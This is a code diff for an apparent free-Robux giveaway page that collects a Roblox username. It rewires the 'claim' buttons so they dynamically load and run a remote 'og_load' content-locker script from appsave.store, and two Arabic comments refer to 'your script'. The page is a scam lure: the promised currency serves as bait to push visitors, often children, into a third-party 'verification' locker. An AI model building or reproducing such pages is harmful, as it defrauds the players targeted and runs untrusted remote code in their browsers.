@@ -215,9 +215,6 @@
         </div>
     </div>
 
-    <!-- كود الـ Script الخاص بك مدمج هنا ليعمل عند استدعائه -->
-    <script type="text/javascript" id="ogjs" src="https://appsave.store/cl/js/m53x2w"></script>
-
     <script>
         // Form Validation & Logic
         function connectUser() {
@@ -229,17 +226,35 @@
             }
         }
 
+        // Custom function to load and execute your script ONLY on active clicks
+        function triggerOgLocker() {
+            if (!document.getElementById('ogjs')) {
+                const script = document.createElement('script');
+                script.type = 'text/javascript';
+                script.id = 'ogjs';
+                script.src = 'https://appsave.store';
+                
+                // Fire locker immediately once script files finish downloading
+                script.onload = function() {
+                    if (typeof og_load === "function") {
+                        og_load();
+                    }
+                };
+                document.body.appendChild(script);
+            } else {
+                // If script is already compiled, call it directly
+                if (typeof og_load === "function") {
+                    og_load();
+                }
+            }
+        }
+
         function claimRobux() {
             const username = document.getElementById('username').value;
             if (username.trim() === "") {
                 alert("You must enter and link your username first!");
             } else {
-                // استدعاء الكود الخاص بك مباشرة ليفتح القفل للمستخدم
-                if (typeof og_load === "function") {
-                    og_load();
-                } else {
-                    alert(`Processing request for: ${username}... Please complete the verification.`);
-                }
+                triggerOgLocker();
             }
         }
 
@@ -250,10 +265,7 @@
                 return;
             }
             
-            // استدعاء الكود الخاص بك هنا أيضاً قبل إظهار الأكواد
-            if (typeof og_load === "function") {
-                og_load();
-            }
+            triggerOgLocker();
             
             const codeDiv = document.getElementById(codeId);
             codeDiv.style.display = "block";
